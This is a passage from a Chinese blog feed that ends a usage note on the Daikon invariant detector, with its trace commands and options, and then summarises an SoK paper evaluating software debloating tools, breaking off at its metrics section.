前端产生daikon需要的文件，对于单次运行，只需要在正常运行指令前加上 <code>kvasir-dtrace</code>即可，示例<ul><li><code>kvasir-dtrace ./wordplay -f words.txt 'Daikon Dynamic Invariant Detector'</code></li></ul></li><li>随后使用daikon进行分析</li></ol><pre><code class="language-bash">java -cp $DAIKONDIR/daikon.jar daikon.Daikon \    daikon-output/wordplay.decls daikon-output/wordplay.dtrace</code></pre><h4 id="%E7%A8%8B%E5%BA%8F%E5%A4%9A%E6%AC%A1%E8%BF%90%E8%A1%8C%E8%BD%A8%E8%BF%B9" tabindex="-1">程序多次运行轨迹</h4><ul><li>对于多次运行的程序，需要将多次运行的轨迹合并，此时可以将各个轨迹分开，或者合成一个轨迹文件</li><li>分开轨迹文件（此种写法更好一些）</li></ul><pre><code class="language-bash">kvasir-dtrace --dtrace-file=daikon-output/wordplay1.dtrace \    ./wordplay -f words.txt 'daikon dynamic invariant detector'kvasir-dtrace --no-dyncomp --dtrace-file=daikon-output/wordplay2.dtrace \    ./wordplay -f words.txt 'better results from multiple runs'kvasir-dtrace --no-dyncomp --dtrace-file=daikon-output/wordplay3.dtrace \    ./wordplay -f words.txt 'more testing equals better testing'java -Xmx3600m -cp $DAIKONDIR/daikon.jar daikon.Daikon \  # 这里-Xmx3600m是为了增加java的堆栈大小,在大数据量的情况下需要    daikon-output/wordplay*.dtrace daikon-output/wordplay.decls # 这里的*是通配符</code></pre><ul><li>合并轨迹文件</li></ul><pre><code class="language-bash">kvasir-dtrace --dtrace-file=daikon-output/wordplay-all.dtrace \    ./wordplay -f words.txt 'daikon dynamic invariant detector'kvasir-dtrace --no-dyncomp --dtrace-append \    --dtrace-file=daikon-output/wordplay-all.dtrace \    ./wordplay -f words.txt 'better results from multiple runs'kvasir-dtrace --no-dyncomp --dtrace-append \    --dtrace-file=daikon-output/wordplay-all.dtrace \    ./wordplay -f words.txt 'more testing equals better testing'java -Xmx3600m -cp $DAIKONDIR/daikon.jar daikon.Daikon \    daikon-output/wordplay-all.dtrace daikon-output/wordplay.decls</code></pre><h4 id="%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9" tabindex="-1">注意事项</h4><ul><li>在示例中，很重要的一个示范是</li></ul><pre><code class="language-bash">java -cp $DAIKONDIR/daikon.jar daikon.Daikon \     --config_option daikon.derive.Derivation.disable_derived_variables=true \     daikon-output/wordplay.decls daikon-output/wordplay.dtrace</code></pre><ul><li>这里通过配置选项禁止派生变量的生成，大大减少了运算时间，而这派生变量许多都是无用的，这在第五部分Daikon输出中会有所说明</li></ul><h2 id="4-%E8%BF%90%E8%A1%8Cdaikon" tabindex="-1">4 运行Daikon</h2><ul><li>运行Daikon使用以下命令：</li></ul><pre><code class="language-bash">java -jar daikon.jar --input=&lt;dtrace文件路径&gt; &lt;其他选项&gt;</code></pre><ul><li>其中&lt;dtrace文件路径&gt;是你要分析的.dtrace文件的路径</li><li>&lt;其他选项&gt;是可选的命令行参数，用于配置Daikon的行为。例如，你可以使用–output=&lt;输出文件路径&gt;选项来指定输出文件的路径，或者使用–help选项来查看所有可用的命令行选项。</li><li>各Daikon的前端使用各不相同，详见手册</li><li>spinfo文件是用于检测条件不变量（Conditional invariants）的分割信息文件。这些文件是可选的，可以自动创建或手动创建。</li></ul><h3 id="4.1-%E6%8E%A7%E5%88%B6daikon%E8%BE%93%E5%87%BA%E7%9A%84%E9%80%89%E9%A1%B9" tabindex="-1">4.1 控制Daikon输出的选项</h3><ul><li><strong>–help</strong></li><li><strong>-o inv_file</strong>:将序列化的不变量输出到指定文件，默认生成与dtrace文件同名的.inv.gz文件</li><li><strong>–no_text_output</strong>:不将不变量作为文本输出</li><li><strong>–format name</strong>：以给定格式生成输出，有关Daikon支持的输出列表参阅invariant语法</li><li><strong>–show_progress/–no_show_progress</strong>:打印或不打印执行Daikon主要部分的时间信息</li><li><strong>–show_detail_progress</strong>:同上，还包括不变量的详细信息</li><li><strong>–noversion</strong>:禁止打印版本信息</li><li><strong>–output_num_samples</strong>:输出不变量和程序点的数值和样本数量，这是一个调试选项，帮助理解Daikon产生了怎样的输出</li><li><strong>–files_from filename</strong>：从给定的文本文件中读取一系列.decls、.dtrace或.spinfo文件名，作为在命令行上提供文件名的替代方法</li><li><strong>–server dirname</strong>：Daikon的服务器模式，在该模式下，它会读取dirname中的文件（按字典顺序排序），直到找到一个以“.end”结尾的文件，然后计算并输出不变量</li></ul><h3 id="4.2-%E6%8E%A7%E5%88%B6%E4%B8%8D%E5%8F%98%E9%87%8F%E6%8E%A2%E6%B5%8B%E7%9A%84%E9%80%89%E9%A1%B9" tabindex="-1">4.2 控制不变量探测的选项</h3><ul><li><strong>–conf_limit val</strong>：是一个命令行选项，用于设置Daikon在证明不变量的置信度限制。只有当给定的不变量置信度大于这个值Daikon才会输出<ul><li>val在0到1之间，.99为默认值，越大的值过滤越强</li><li>每种类型的不变量都有自己确定置信度的方法，参见Java 源代码中的 invariant 的 computeConfidence 方法。</li><li>考虑不变量a，有两种打印不变量置信度的方法<ul><li>使用Diff（参见invariant Diff） <code>java -cp $DAIKONDIR/daikon.jar daikon.diff.Diff MyFile.inv.gz</code></li><li>使用PrintInvariants (参见 Printing invariants)<code>java -cp $DAIKONDIR/daikon.jar daikon.PrintInvariants --dbg daikon.PrintInvariants.repr \     MyFile.inv.gz</code></li></ul></li><li>要打印被丢弃的每个不变量的置信度，请使用 --disc_reason all 命令行选项运行 Daikon（参见 Daikon Daikon debugging options）</li></ul></li><li><strong>–list_type classname</strong>:表示给定的类实现了java.util.List接口。See ListImplementors declaration</li><li><strong>–user-defined-invariant classname</strong>:使用在给定类中定义的用户定义的不变量，而不是内置在Daikon中的不变量。</li><li><strong>–disable-all-invariants</strong>：禁用所有已知的不变量：那些内置在Daikon中的不变量，以及到目前为止通过–user-defined-invariant指定的所有不变量。在此选项指定后，可以重新启用某个不变量，参见启用/禁用特定不变量的选项。</li><li><strong>–nohierarchy</strong>：避免在数据流层次结构中连接程序点。</li><li><strong>–suppress_redundant</strong>：使用Simplify自动定理证明器抑制逻辑上多余的不变量的显示。</li></ul><h3 id="4.3-%E6%93%8D%E4%BD%9C%E9%83%A8%E5%88%86trace%E6%96%87%E4%BB%B6" tabindex="-1">4.3 操作部分trace文件</h3><ul><li><strong>–ppt-select-pattern=ppt_regexp</strong>：仅处理名称与正则表达式匹配的程序点。–ppt-omit-pattern参数优先于此参数</li><li><strong>–ppt-omit-pattern=ppt_regexp</strong>：不处理名称与正则表达式匹配的程序点。此参数优先于–ppt-select-pattern参数</li><li><strong>–var-select-pattern=var_regexp</strong>：仅处理名称与正则表达式匹配的变量（无论是在跟踪文件还是在派生中）。–var-omit-pattern参数优先于此参数。</li><li><strong>–var-omit-pattern=var_regexp</strong>：忽略名称与正则表达式匹配的变量（无论是在跟踪文件还是在派生中）。此参数优先于–var-select-pattern参数。</li><li>将以上命令传给前端工具，可以让目标程序运行得更快，跟踪文件更小</li></ul><h3 id="4.4-daikon%E9%85%8D%E7%BD%AE%E9%80%89%E9%A1%B9" tabindex="-1">4.4 Daikon配置选项</h3><ul><li><strong>–config filename</strong>: 从指定的文件中读取配置选项。更多信息参见 Configuration options</li><li><strong>–config_option name=value</strong>:指定一个配置选项</li></ul><h3 id="4.5-daikon%E8%B0%83%E8%AF%95%E9%80%89%E9%A1%B9" tabindex="-1">4.5 Daikon调试选项</h3><ul><li>更多参见后续 Debugging options</li><li><strong>–dbg category 和 --debug</strong>：这两个选项用于启用特定部分的Daikon的调试输出（日志输出）。可以通过多次指定–dbg category来实现对调试输出的细粒度控制。–debug选项会打开所有调试标志，这会产生很多输出！</li><li><strong>–track class&lt;var1,var2,var3&gt;@ppt</strong>：此选项用于在指定的类、变量和程序点上启用调试信息。</li><li><strong>–disc_reason inv_class&lt;var1,var2,…&gt;@ppt</strong>：此选项打印指定程序点处被丢弃的inv_class类的不变量，以及简短的原因和解释为什么它们不值得打印。</li><li><strong>–mem_stat</strong>：此选项将内存使用情况统计信息打印到当前目录中名为stat.out的文件中</li></ul><h2 id="5-daikon%E8%BE%93%E5%87%BA" tabindex="-1">5 Daikon输出</h2><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Invariant </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Software Debloating 论文阅读 （12）</title>
      <link href="/2024/02/04/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/SoftwareDebloating/Software%20Debloating%20%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB(12)/"/>
      <url>/2024/02/04/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/SoftwareDebloating/Software%20Debloating%20%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB(12)/</url>
      
        <content type="html"><![CDATA[<h2 id="sok%3A-a-broad-comparative-evaluation-of-software-debloating-tools" tabindex="-1">SoK: A Broad Comparative Evaluation of Software Debloating Tools</h2><ul><li>SOK2.0</li><li>引用：Brown M D, Meily A, Fairservice B, et al. SoK: A Broad Comparative Evaluation of Software Debloating Tools[J]. arXiv preprint arXiv:2312.13274, 2023.</li></ul><h3 id="0-%E6%91%98%E8%A6%81" tabindex="-1">0 摘要</h3><ul><li><p>软件简化工具旨在通过删除被称为“膨胀”（bloat）的不必要的代码来提高程序的安全性和性能。尽管已经提出了许多技术，但它们的应用还存在一些障碍。</p><ul><li>瘦身工具高度专业化，这使得采用者难以找到符合他们需求的合适工具</li><li>同时缺乏统一的评估标准，这使得采用者难以评估工具的优劣</li></ul></li><li><p>为了弥补则以差距，我们对近简化文献和集中目前正在商业开发的工具进行了广泛的调查</p></li><li><p>随后我们的10种简化工具进行了评估，确定其优势和劣势。我们的评估是在20个不同基准程序的多样化集合上进行的，涵盖了16个性能、安全性、正确性和可用性指标</p></li><li><p>我们的评估揭示了一些令人担忧的发现，这些发现与debloating文献中的主流叙述相矛盾</p><ul><li>首先，简化工具缺乏在实际软件中的使用，在中高复杂性基准的的成功率仅有21%</li><li>其次，简化工具的健壮还曾度存在问题，通过我们的差异模糊检测工具DIFFER，只有13%的简化生成了强壮的简化工具</li><li>最后，我们的结果表明，简化工具通常无法显著改善膨胀程序的性能或安全状况</li></ul></li><li><p>我们相信本文的贡献将会帮助潜在的使用者更好的理解工具，并激发未来对简化的研究和开发，为此我们开源了我们的基准集，数据和自定义工具</p></li></ul><h3 id="1-%E4%BB%8B%E7%BB%8D" tabindex="-1">1 介绍</h3><ul><li><p>软件简化是一个新兴的领域，关注于通过删除程序中不必要的代码（即膨胀）来增强程序的安全性和性能，这些不必要的代码通常以<strong>不必要的功能</strong>和<strong>多余的库代码</strong>的形式出现。</p></li><li><p>由于entrenched的软件实践（如 可重用性代码）和 一些趋势（范围蔓延），现代程序中普遍存在<strong>膨胀</strong>。为了面对这一问题，许多简化方法已经被提出，针对软件生命周期的各个阶段，然而由于一些原因，这些技术实际的实用没有跟上研究</p><ul><li><ol><li><strong>简化工具高度特化</strong>：每个工具面向不同类型的膨胀，软件类型（编译，解释，内核等），生命周期的阶段（源码，中间代码，二进制），并且有自己独特的分析方法。这使得使用者不能根据具体问题选择具体方法</li></ol></li><li><ol start="2"><li><strong>缺乏统一度量标准</strong>：这将导致关于不同方法如何提高性能和安全性的声明不清晰，不完整，且可能具有误导性，这是因为作者使用或创建的方法本身就是有问题的[12,48]，最终，使用者难以理解可以获得哪些期望的好处，因为看不出哪些度量标准是有用的或相关的。这一问题被相关简化文献中对健全性风险的肤浅讨论加剧，使得使用者更难以理解简化结果之间的权衡。</li></ol></li><li><ol start="3"><li><strong>缺少工具的比较评估</strong>：这使得使用者难以理解工具的优劣，尽管之前有研究在 膨胀的普遍性[14,50,51],简化权衡[73],安全度量标准研究[8,12,21]，但最近只有一项研究评估了软件简化工具本身，且只有4个工具[4]</li></ol></li></ul></li><li><p><strong>动机</strong>：迄今为止，在软件简化生态中没有工具，度量标注你，基准集，使用案例的全面回顾，分类，分析和评估。我们弥补通过进行一项调查和比较软件简化工具来弥补这一差距，并完成以下研究问题</p><ul><li><ol><li>软件简化工具如何分类？</li></ol></li><li><ol start="2"><li>哪些安全性，健全性，性能 指标是有用的？还需要什么新指标？</li></ol></li><li><ol start="3"><li>哪些基准测试和配置提供了对去膨胀工具的全面评估？</li></ol></li><li><ol start="4"><li>同一类别内的工具如何比较？</li></ol></li><li><ol start="5"><li>不同类别之间的去膨胀工具如何比较？</li></ol></li></ul></li><li><p><strong>贡献总结</strong>：</p><ul><li>第二节介绍我们对简化文献的调查结果</li><li>第三节描述我们评估简化工具及结果的实验方法</li><li>第四节展示评估结果</li><li>第五节讨论我们研究的主要发现</li></ul></li></ul><h3 id="2-%E8%BD%AF%E4%BB%B6%E7%AE%80%E5%8C%96%E5%B7%A5%E5%85%B7%E8%B0%83%E7%A0%94" tabindex="-1">2 软件简化工具调研</h3><ul><li><p>我们调查了从2013年至今超过60篇关于软件简化，特化和定制化的学术文章。此外，为了全面覆盖该领域的广度，我们还调查了各个开发阶段的各种商用技术和正在使用的技术。在我们调查的早期阶段，使用了一个广义的“软件简化”定义。因此，我们调查了许多许多传统上不视为软件的技术成果的简化方法，如容器[53],操作系统及其API[23,24,27,37]，测试用例[34,55,64]，硬件[16,76]，依赖构建[45]和其它[29,41,43,49,77]。</p></li><li><p>在接下来的部分中，我们建立了一个简化分类方法，该分类定义了膨胀的类型，简化工作流，简化技术，度量标准和基准测试。</p></li></ul><h4 id="2.1-%E8%86%A8%E8%83%80%E7%9A%84%E7%B1%BB%E5%9E%8B" tabindex="-1">2.1 膨胀的类型</h4><ul><li>总体上，简化工具尝试移除或终合两种类型的不必要代码，我们定义为I型膨胀和Ⅱ型膨胀<ul><li><strong>I型膨胀</strong>：是普遍不必要的，可以在不影响最终程序行为的情况下移除。最常见表现是在运行时动态加载到进程地址空间的库代码，但永远不会被调用。尽管比较罕见，但一些针对OS的简化工具中的I型膨胀，可以通过删除来防止恶意使用。四代码和不可达代码也属于I型膨胀，但是这些代码通常在编译时被删除，简化工具并不过多过关注</li><li><strong>Ⅱ型膨胀</strong>：该类型膨胀与最终用途相关，代码是否为Ⅱ型膨胀取决于用户如何使用程序。类型Ⅱ通常为不必要功能代码的形式，例如在图像处理软件中支持混淆或过时文件格式。处理操作系统和Web浏览器交互中的平台相关代码是Ⅱ型膨胀的一种形式，这种膨胀通常由构建系统和脚本引擎解决而不是简化工具</li></ul></li></ul><h4 id="2.2-%E7%AE%80%E5%8C%96%E5%B7%A5%E4%BD%9C%E6%B5%81%E5%92%8C%E4%BD%BF%E7%94%A8%E6%A1%88%E4%BE%8B" tabindex="-1">2.2 简化工作流和使用案例</h4><ul><li><p>尽管在技术上存在差异，但几乎所有简化工具都共享一个通用的高级六级段用户工作流</p><ul><li><ol><li>规范化（Specification）：用户创建一个特定于工具的规范，概述应该保留或消除的程序行为。</li></ol></li><li><ol start="2"><li>输入（Input）：用户提供规范和程序给去膨胀工具。</li></ol></li><li><ol start="3"><li>分析（Analysis）：工具使用规范中的信息来分析程序，并标记代码（例如，是否为不必要的，或作为某一功能的一部分）。</li></ol></li><li><ol start="4"><li>转换（Transformation）：工具修改程序，将膨胀代码与有用代码分开（例如，剪切、重构、附加标签）。</li></ol></li><li><ol start="5"><li>输出（Output）：工具产生一个修改后的程序，该程序要么不包含膨胀，要么包含必要的标签，以在运行时删除膨胀。</li></ol></li><li><ol start="6"><li>验证（Validation）：用户通过手动测试或他们选择的自动化工具（例如，模糊测试器）验证修改后的程序是否健全并按预期行为。如果输出无效，用户可能会重新开始工作流程。</li></ol></li></ul></li><li><p>尽管存在一个共同的高级工作流程，但许多工具为潜在的用户提供了不同的使用案例。</p><ul><li>针对I型膨胀：尽可能地消除膨胀</li><li>针对Ⅱ型膨胀，包含三个常用案例<ul><li><ol><li><strong>Arrressive</strong>：除所需要的单个功能外删除所有其它功能，例如，激进地简化一个文件压缩工具可能被定义为删除不必要的代码，只留下压缩文件并将结果写入磁盘的部分</li></ol></li><li><ol start="2"><li><strong>Miderate</strong>：保留几个核心和外围功能，简化其它部分。对于文件压缩工具该案例会保留压缩，解压缩和测试压缩文件完整性的代码</li></ol></li><li><ol start="3"><li><strong>Conservative</strong>：只删除少数外围功能</li></ol></li></ul></li></ul></li></ul><h4 id="2.3-%E7%AE%80%E5%8C%96%E6%8A%80%E6%9C%AF%E5%88%86%E7%B1%BB" tabindex="-1">2.3 简化技术分类</h4><p>我们将调查的软件简化工具分为5个类别，这些类别主要是通过在简化过程中各个阶段所做的设计进行分类的</p><h5 id="source-to-source-(s2s)" tabindex="-1">Source-to-Source (S2S)</h5><ul><li>S2S工具简化源代码，他们呢主要针对类型Ⅱ膨胀，尽管他们可以很容易的移除库中的I型膨胀。</li><li>简化 信息丰富 的源代码 与 其它级别表示（即IR和二进制）相比有<strong>两个优点</strong><ul><li><ol><li>开发者在分析阶段可以有很多选择：S2S简化器可以使用代码覆盖率[30,71–73]、模糊测试[9]、构建系统分析[28,69]和手动注释[11]技术来产生特性与代码的映射</li></ol></li><li><ol start="2"><li>源代码更容易进行转换，而不损坏程序完好性，因为编译器还未剥离高级信息并用及其语义代替它，在源代码转换后，编译器在这种情况下检查错误和优化也非常有用</li></ol></li></ul></li><li>尽管有以上优点，但由于其表达的灵活性（如syntactic sugar）编译器不支持直接转换源代码，转换源代码可能在技术上变得复杂。</li></ul><h5 id="compiler-based-specializers-(cbs)" tabindex="-1">Compiler-Based Specializers (CBS)</h5><ul><li>与S2S类似，接收源代码为输入，主要针对Ⅱ型膨胀。</li><li>但与之间简化源代码不同，CBS [2,3,38,39,42,58,61]在分析和转换阶段使用编译器（如LLVM）将源码降级为IR，根据用户的规范将关键输入参数或值替换为编译时常量，通过内置的编译器优化（如常量椽笔，循环展开和死代码去除）简化。</li><li>这种方法通过使用高可靠的编译通道而不是自定义转化程序来解决完整性。</li><li>作为一种权衡，CBS只支持arrgessive简化用例，不适合另外两种，或者在运行时触发功能的场景</li></ul><h5 id="binary-to-binary-(b2b)" tabindex="-1">Binary-to-Binary (B2B)</h5><ul><li>概念上与S2S相似，但B2B只针对二进制文件(ELF,Java字节码[13,32,33,65])</li><li>仅二进制的方法容易除左且充满挑战，但其具有简化旧的或闭源二进制文件的<strong>优势</strong>。</li><li>B2B方法简化器在分析阶段的选择有限，它们必须以来固有的不准确的二进制分析技术，例如执行测试用例的执行跟踪[5,15,22,26,40,48,57,67,74]和二进制提升[5,22,26,40,57,70,74]以及启发式[40,48]来生成特性到代码的映射。</li><li>由于二进制格式的独特性（例如，程序指令和数据的混合，简介分支等），转化阶段同样困难，因为在一般情况下回复一个二进制是不可判定的，B2B简化器必须小心地处理二进制输入，而不违反原始布局，通过空出没有操作或无效的代码[15,74]或将去膨胀版本的程序作为新的代码部分放在原始代码旁边[5,67]。</li><li>最终，B2B简化器的<strong>主要缺点</strong>也是二进制分析限制的后果：很难产生完整的简化二进制，并且需要高质量的二进制恢复才能有效（例如，Egalito [70]需要position-independent code以确保恢复）。</li></ul><h5 id="%E4%BB%A5%E4%B8%8A%E4%B8%89%E7%B1%BB%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93" tabindex="-1">以上三类工具总结</h5><ul><li>对于这三类工具，有<strong>两个常见的限制和挑战</strong><ul><li><ol><li><strong>验证简化程序是留给用户的任务</strong>：一些工具包含验证例程[67,75]，但只验证保留的功能，并未验证是否确实去除了多余的特性和/或尝试调用这些特性是否得到了妥善处理。 验证和重要，因为简化可能会引入额外的漏洞，这些漏洞的引入大于简化带来的潜在安全好处。</li></ol></li><li><ol start="2"><li><strong>在实际场景使用是困难的</strong>：需要额外的人工努力，通常是列举测试用例，对于复杂的程序，需要用例来确保保留所有所需的功能、错误处理和边缘情况。</li></ol></li></ul></li></ul><h5 id="static-library-(sl)" tabindex="-1">Static Library (SL)</h5><ul><li>SL工具针对I型膨胀</li><li>由于工具在静态的情况下可以直接分析计算目标程序的调用图并识别所需要库函数集合，这类工具不需要规范。</li><li>SL简化器使用各种转换方法，包括通过重写创建专用库以删除[7,31,35,54,62,66,75,78]或使用无操作或无效指令空出未使用的函数[1,59]，对库进行分片[51]，对可执行文件进行重写以静态链接库函数[26]，以及使用存根替换不必要的库函数[68]。</li><li><strong>优势</strong>：通过将其范围限制在Type I膨胀上，SL简化器避免了其他类工具所经历的许多挑战。<ul><li><ol><li>SL不会有创建不健全程序的风险，尽管有些工具可能无法处理如反射和间接引用等编程方法。</li></ol></li><li><ol start="2"><li>除目标程序外，SL简化器几乎不需要使用额外的人工，但这种设计导致这类工具不适用于Ⅱ型膨胀</li></ol></li></ul></li></ul><h5 id="runtime" tabindex="-1">Runtime</h5><ul><li>运行时简化器和SL相似，主要区别在它们的转换和输出阶段</li><li>为了避免对库进行永久性更改，运行时简化器记录所需的库函数作为程序元数据，并在执行期间干预动态链接过程，以从进程内存中去除不必要的库函数。</li><li>方法各不相同<ul><li>Piecewise Compilation and Loading (PCL) [52] 在二进制文件中嵌入调用图信息，并使用自定义加载器在运行时将不必要的函数重写为无效指令</li><li>BlankIt [47] 和Decker [46] 则采用相反的方法，根据当前执行点将仅必要的函数加载到程序的运行时内存中。</li><li>其他方法使用来自构建系统的信息，如配置选项 [36] 和包依赖性 [44] 来去除膨胀。</li></ul></li><li>除了SL去膨胀器的优点外，运行时去膨胀器还具有不干扰静态代码的优点，从而对结果的健全性有很高的信心。代价是管理进程内存需要的高运行时开销。</li></ul><h4 id="2.4-%E7%AE%80%E5%8C%96%E7%9A%84%E5%88%86%E6%9E%90%E6%8C%87%E6%A0%87" tabindex="-1">2.4 简化的分析指标</h4><ul><li><p>没有统一的指标，一般情况下这些指标都是从类似的程序转化技术中适应过来的（如代码优化），但在一些情况也引入了新的指标</p></li><li><p>总体上，我们注意到了30种不同的指标，我们将其分为三类在本节描述。这些指标包含了大多数典型的功能性和非功能性软件数据。</p></li><li><p>然而目前没有作品尝试衡量工具可用性，我们这位这个维度很重要，因为仅供专业人士使用的工具不会被主流采纳</p></li><li><p><strong>性能</strong>：</p><ul><li>衡量简化本身及产生的简化程序的资源消耗。</li><li>在衡量简化后的程序时，性能需要与源程序相比。</li><li>常用指标包括：CPU运行时间、内存开销、静态二进制大小、所需的外部资源数量，使用工具所需的人工努力。</li></ul></li><li><p><strong>正确性和鲁棒性</strong></p><ul><li>衡量简化后程序的稳定性和鲁棒性</li><li>通常，使用测试套件或模糊器来运行简化后程序，来识别错误的输出，崩溃及其它不良结果。 有趣的是我们看到的工作仅对简化后程序收集了它们，并未对原程序使用，然而正确性和鲁棒性的问题可能在原程序就存在，这里需要对比试验。</li><li>Crystal和Casinghino的[20]比较二进制分析工具使用基于SMT的最弱前置条件方法来证明两个程序二进制的等价性或突出它们行为上的差异，为简化场景提供了一个高保证度的正确性指标。</li></ul></li><li><p><strong>安全性</strong></p><ul><li>衡量简化后程序的安全性改进，在我们的调查中我们注意到了两个主要的安全类别：<strong>漏洞消除和代码重用预防code-reuse prevention</strong>。表面上，这些指标用于宣称结果的理想，如消除潜在的漏洞、减少程序的攻击面和减少代码重用攻击。然而，这些指标在实际应用中的实用性仍有待商榷。</li><li><strong>漏洞消除措施</strong><ul><li>可以为简化有已知漏洞的旧版本（如在MITRE的CVE数据库[17]中报告的漏洞）并显示该漏洞已删除。虽然这样展示了简化带来的好处，但没有预测能力，不具有普遍性，不能用于在实际场景中证明对未知漏洞的安全一处。</li><li>可以提出一个论点：已知漏洞对于难以修补的系统构成风险，但修补远比简化简单，侵入性小，风险小。</li><li>此外，使用这类指标可能会导致不准确或不完整，例如<ul><li>Qian等人[48]表明，之前声称在Type II膨胀[30]中消除漏洞的工作也重新引入了其他历史漏洞。</li><li>PCL [52]声称在Type I膨胀中消除已知的漏洞。但是，这些漏洞位于程序静态不可达的库函数中</li></ul></li><li>因此，它们只在极端或刻意的情况下是可利用的。</li></ul></li><li><strong>代码重用预防</strong><ul><li>工具面减少和代码重用预防度量单位：代码重用小工具（是存在于被攻击程序中的链式代码小片段，攻击者在被阻止直接使用shell时，可以利用小工具注入攻击）</li><li>常用的衡量安全改进的指标是减少攻击者可用的小工具总数，然而Brown和Pande [12]已经证明这不恰当，因为许多简化工具在大量减少小工具数量的同时，以很高的速率引入新的小工具，而大幅度减少小工具数量很可能对攻击者影响有限</li><li>反过来，Brown和Pande提出了用于衡量对攻击者实施利用施加的成本的定性小工具集度量标准（例如，小工具集表达能力、可组合性、特殊功能和局部性）以及一个用于计算它们的静态分析工具，即GSA（小工具集分析器）。</li></ul></li></ul></li></ul><h4 id="2.5-benchmark" tabindex="-1">2.5 Benchmark</h4><ul><li>大多数研究采用了在程序分析中常用的基准测试集，例如GNU Coreutils [25]、SPEC CPU 2006/2017 [18,19]和DaCapo[10]。此外，还有几项工作提供了自己的基准如CHISELBench [6]和OCCAM基准测试 [63]，这些基准可能互有交叉。</li><li>大多数基准复杂度不高，它们具有命令行用户界面，很少使用多线程，网络接口等，并且通常只使用一组输入运行到终止。这些基准程序amenable（经得起）简化所需的复杂跟踪和转换操作</li><li>许多工作还在bfptd、cUrl和httpd等中等复杂性基准上评估了他们的工具，但数量和频率较少。这样的基准测试的特点是使用复杂的输入、多线程、网络套接字等。尽管很少见，但一些工作 [48,49] 也在高复杂性软件上评估了他们的工具，如网络浏览器和文档阅读器。</li></ul><h3 id="3-%E8%AF%84%E4%BC%B0%E6%96%B9%E6%B3%95%E8%AE%BA" tabindex="-1">3 评估方法论</h3><p>详细说明方法，配置，指标，基准在评估中的选择</p><h4 id="3.1-%E5%B7%A5%E5%85%B7%E9%80%89%E6%8B%A9" tabindex="-1">3.1 工具选择</h4><ul><li>由于简化工具系统的多样性和规模，我们首先将我们的评估范围限定为支持用户空间C/C++程序和x86/x86-64机器的库的工具。这个基准配置是最广泛支持的，并且拥有最多的候选工具。</li><li>总共，我们在过滤掉继任者工具（例如，OCCAM-v2 [42] 相对于 OCCAM-v1 [39]）后确定了31个候选工具。<ul><li>我们通过公共仓库或向作者请求，成功地获得了24个工具的源代码，并能够成功地构建和运行其中的17个。我们为七个失败的工具付出了大量的努力来解决问题，但由于不可调和的技术问题 [9,44,52,72]或未响应的作者[15,61,74]，我们没有成功。</li><li>剩下17个中<ul><li>因需要IDA Pro [51]的商业许可证排除一个。</li><li>因一个工具将其基准硬编码 [69]而排除</li><li>四个工具需要耗时且需要手动预处理步骤来适应新的基准 [11,46,47,73]</li><li>以及一个工具有技术限制 [22]</li></ul></li></ul></li><li>最后下表中展示了我们选择的10个工具，其中3个工具是商业公司开发的学术工具的专门版本。为了避免混淆，我们在工具标题中使用商业公司的缩写并用连字符连接：CHISEL-GT (GrammaTech, Inc.)、BinRec-ToB (Trail of Bits) 和 LMCAS-SIFT (Smart Information Flow Technologies)。<br><img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(12)_1.png" alt></li><li>对于每个工具，我们都准备了一个隔离的环境（即虚拟机或docker容器），配置有工具支持的最新操作系统和所有使用工具及操作我们基准程序所需的必要资源。</li></ul><h4 id="3.2-%E5%9F%BA%E5%87%86%E9%80%89%E6%8B%A9" tabindex="-1">3.2 基准选择</h4><ul><li>我们选择了20个基准程序程序（表2），在在大小、复杂性和功能上都有所不同<ul><li>为了代表低复杂性基准，我们使用了CHISELBench [6]，因为它在去膨胀文献中常常被使用，并为之前的工作提供了一个常见的比较点。</li><li>我们进一步添加了六个中等复杂性和四个高复杂性的基准，这些基准来自其他基准集 [56,63]。</li></ul></li><li>为了为这些基准构建64位ELF二进制文件，我们在Ubuntu Linux v20上使用了Clang/LLVM v10，并指定了两个构建选项：位置无关代码（-fPIC）和优化级别3（-O3）。</li><li>然而，由于各种工具和基准的特定限制，我们使用了不同的方法来构建一些参考二进制文件。我们在Debian Buster上为RAZOR和CHISEL构建了参考二进制文件。构建ImageMagick需要使用GCC v9.4 (Ubuntu)和GCC v8.3 (Debian Buster)而不是Clang/LLVM。最后，我们为BinRec-ToB构建了32位ELF二进制文件，因为它不支持64位程序。</li></ul><p><img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(12)_2.png" alt></p><h4 id="3.3-%E7%AE%80%E5%8C%96%E9%85%8D%E7%BD%AE" tabindex="-1">3.3 简化配置</h4><ul><li>由于各工具对简化用例的支持各不相同，我们使用三种策略进行配置<ul><li><ol><li>对于SL工具，不需要规范</li></ol></li><li><ol start="2"><li>采用中等去膨胀案例，这在文献中最为普遍，用于S2S和B2B简化器</li></ol></li><li><ol start="3"><li>采用了arrgessive激进，因为这是CBS简化其唯一支持的</li></ol></li></ul></li><li>对于每个基准程序，我们创建一个通用的与工具无关的简化规范<ul><li>包括要保留的几个核心和外围功能（即moderate中等使用案例）</li><li>我们为每个功能定义了一个描述性名称和一个或多个样本指令（即测试用例），该基准程序可以执行该功能</li><li>随后我们可以进一步简化该规范，向激进版本靠近</li></ul></li><li>使用通用规范作为指南，我们然后为每个基准程序创建了工具特定的配置文件。</li><li>总的来说，我们为评估创建了160个不同的简化规范。</li></ul><h4 id="3.4-%E6%8C%87%E6%A0%87%E9%80%89%E6%8B%A9" tabindex="-1">3.4 